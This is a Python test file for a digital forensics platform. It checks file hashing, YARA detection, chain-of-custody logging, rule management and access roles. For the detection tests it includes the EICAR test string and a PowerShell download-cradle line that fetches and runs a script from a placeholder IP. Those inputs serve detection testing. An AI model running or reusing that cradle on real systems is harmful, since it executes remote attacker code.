import io

from fastapi.testclient import TestClient

from backend.app.core.security import create_access_token
from backend.app.models.user import UserRole
from backend.app.schemas.user import UserCreate

EICAR_STRING = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def get_auth_headers(client: TestClient, role: UserRole, username: str) -> dict[str, str]:
    user_in = UserCreate(
        email=f"{username}@example.com",
        username=username,
        full_name=f"{username.capitalize()} User",
        password="ValidStrongPassword123!",
        role=role,
    )
    res = client.post("/api/v1/auth/register", json=user_in.model_dump())
    assert res.status_code == 201
    user_id = res.json()["id"]

    token = create_access_token(subject=user_id, role=role.value)
    return {"Authorization": f"Bearer {token}"}


def test_static_file_upload_and_hashing(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_forensic1")

    # Sample benign test payload
    sample_content = b"AegisFlow Digital Forensics Platform Test File Buffer."
    file_tuple = ("test_sample.txt", io.BytesIO(sample_content), "text/plain")

    res = client.post(
        "/api/v1/forensics/artifacts/upload",
        files={"file": file_tuple},
        headers=headers,
    )
    assert res.status_code == 201
    data = res.json()

    assert data["filename"] == "test_sample.txt"
    assert len(data["sha256"]) == 64
    assert len(data["md5"]) == 32
    assert len(data["sha1"]) == 40
    assert data["file_size_bytes"] == len(sample_content)
    assert data["verdict"] == "benign"
    assert data["entropy"] > 0.0

    # Chain of custody should have initial entries
    assert len(data["custody_logs"]) >= 2
    assert data["custody_logs"][0]["action"] == "collected"
    assert data["custody_logs"][0]["sha256_at_action"] == data["sha256"]


def test_eicar_yara_rule_matching(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_forensic_eicar")

    file_tuple = ("eicar.com", io.BytesIO(EICAR_STRING.encode("ascii")), "application/octet-stream")

    res = client.post(
        "/api/v1/forensics/artifacts/upload",
        files={"file": file_tuple},
        headers=headers,
    )
    assert res.status_code == 201
    data = res.json()

    assert data["verdict"] == "malicious"
    assert data["severity"] == "critical"
    assert len(data["yara_matches"]) > 0

    rule_names = [m["rule"] for m in data["yara_matches"]]
    assert "EICAR_Standard_Test_File" in rule_names


def test_powershell_dropper_analysis(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_forensic_ps")

    payload = {
        "filename": "suspicious_dropper.ps1",
        "content": "powershell.exe -enc aW52b2tlLWV4cHJlc3Npb24= IEX(New-Object Net.WebClient).DownloadString('http://198.51.100.88/stage2.ps1')",
    }

    res = client.post(
        "/api/v1/forensics/artifacts/analyze-text",
        json=payload,
        headers=headers,
    )
    assert res.status_code == 201
    data = res.json()

    assert data["verdict"] in ("malicious", "suspicious")
    rule_names = [m["rule"] for m in data["yara_matches"]]
    assert "PowerShell_Encoded_Download_Cradle" in rule_names

    # Check extracted strings contain the IP address and suspicious commands
    extracted = data["extracted_strings_sample"]
    assert "198.51.100.88" in extracted["ips"]
    assert any("powershell" in cmd for cmd in extracted["suspicious_commands"])


def test_chain_of_custody_verification_workflow(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_forensic_custody")

    # 1. Upload artifact
    sample = b"Sensitive forensic evidence extracted from compromised disk image."
    res = client.post(
        "/api/v1/forensics/artifacts/upload",
        files={"file": ("evidence_disk.img", io.BytesIO(sample), "application/octet-stream")},
        headers=headers,
    )
    assert res.status_code == 201
    artifact_id = res.json()["id"]
    sha256 = res.json()["sha256"]

    # 2. Append verified custody transfer action
    custody_res = client.post(
        f"/api/v1/forensics/artifacts/{artifact_id}/custody",
        json={
            "action": "transferred",
            "details": "Transferred sealed evidence bag to Secure Digital Vault Locker #4.",
        },
        headers=headers,
    )
    assert custody_res.status_code == 201
    custody_data = custody_res.json()
    assert custody_data["action"] == "transferred"
    assert custody_data["sha256_at_action"] == sha256

    # 3. Fetch custody timeline
    timeline_res = client.get(f"/api/v1/forensics/artifacts/{artifact_id}/custody", headers=headers)
    assert timeline_res.status_code == 200
    timeline = timeline_res.json()
    assert len(timeline) >= 3
    actions = [entry["action"] for entry in timeline]
    assert "collected" in actions
    assert "analyzed" in actions
    assert "transferred" in actions


def test_custom_yara_rule_management(client: TestClient):
    headers = get_auth_headers(client, UserRole.ANALYST, "analyst_yara_admin")

    valid_rule = {
        "name": "Custom_Trojan_Signature_01",
        "threat_type": "trojan",
        "severity": "high",
        "description": "Matches custom backdoor beacon keyword",
        "rule_source": """rule Custom_Trojan_Signature_01 {
    strings:
        $s1 = "AegisFlow_Custom_Trojan_Beacon_Marker_XYZ"
    condition:
        $s1
}""",
    }

    res = client.post("/api/v1/forensics/yara/rules", json=valid_rule, headers=headers)
    assert res.status_code == 201
    data = res.json()
    assert data["name"] == "Custom_Trojan_Signature_01"
    assert data["is_enabled"] is True

    # Test broken syntax is rejected
    broken_rule = {
        "name": "Broken_Rule_Syntax",
        "rule_source": "rule Broken_Rule { strings: $a = 1234 condition: INVALID_SYNTAX",
    }
    bad_res = client.post("/api/v1/forensics/yara/rules", json=broken_rule, headers=headers)
    assert bad_res.status_code == 400


def test_viewer_rbac_restrictions(client: TestClient):
    viewer_headers = get_auth_headers(client, UserRole.VIEWER, "viewer_forensic")

    # Viewer cannot upload files
    file_tuple = ("test.txt", io.BytesIO(b"viewer test"), "text/plain")
    res = client.post(
        "/api/v1/forensics/artifacts/upload",
        files={"file": file_tuple},
        headers=viewer_headers,
    )
    assert res.status_code == 403

    # Viewer CAN view stats and list artifacts
    stats_res = client.get("/api/v1/forensics/stats", headers=viewer_headers)
    assert stats_res.status_code == 200
    assert stats_res.json()["total_yara_rules"] >= 5
